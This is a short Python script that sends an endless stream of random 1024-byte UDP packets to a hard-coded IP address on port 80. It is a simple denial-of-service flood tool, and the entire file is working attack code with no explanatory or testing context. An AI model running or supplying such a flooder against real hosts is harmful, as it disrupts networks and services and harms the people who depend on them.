import socket
import random

target_ip = "172.20.10.6"  
target_port = 80

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

data = random._urandom(1024)

while True:
    sock.sendto(data, (target_ip, target_port))
    print("UDP packet sent")
